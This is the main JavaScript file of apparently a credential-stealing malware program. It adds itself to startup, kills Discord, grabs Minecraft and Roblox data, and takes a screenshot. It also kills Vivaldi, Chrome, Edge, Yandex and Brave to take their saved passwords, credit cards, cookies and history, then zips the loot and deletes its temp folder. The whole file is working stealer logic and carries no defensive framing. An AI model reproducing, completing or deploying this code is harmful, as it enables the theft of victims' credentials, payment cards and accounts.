const { paths: { localAppData } } = require('./util/variables');
const { resolve, sep, join } = require('path');
const { existsSync, mkdtempSync, mkdirSync, rmSync } = require('fs');
const os = require('os');
const config = require('./config');
const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
module.exports.tempFolder = tempFolder;

config.addToStartup && require('./util/functions/startup');
config.killDiscord  && require('./util/functions/kill-discord');
require('./util/functions/grab-mc');
require('./util/functions/grab-roblox');
require('./util/functions/screenshot');
// require('./util/functions/fake-error');

const browsers = [
  ['',       ['Vivaldi']],
  ['chrome', ['Google', 'Chrome', 'SxS']],
  ['chrome', ['Google', 'Chrome']],
  ['msedge', ['Microsoft', 'Edge']],
  ['',       ['Yandex', 'YandexBrowser']],
  ['',       ['BraveSoftware', 'Brave-Browser']],
];

mkdirSync(join(tempFolder, 'Browsers'));
browsers.forEach((browser) => {
  const path = resolve(localAppData, browser[1].join(sep), 'User Data');
  const grab = require('./util/functions/grab-browsers-data');
  // Browser data exists
  if (existsSync(path)) {
    // Kill browser process
    grab.kill(browser[0], () => {
      ['passwords', 'history', 'creditCards', 'cookies', 'topSites']
        .forEach(fn => grab[fn](browser[1].join(' '), path));
    });
  }
});

const sleep = ms => new Promise(r => setTimeout(r, ms));
sleep(1000).then(() => require('./util/functions/zip'));

process.on('beforeExit', () => rmSync(tempFolder, { recursive: true }));
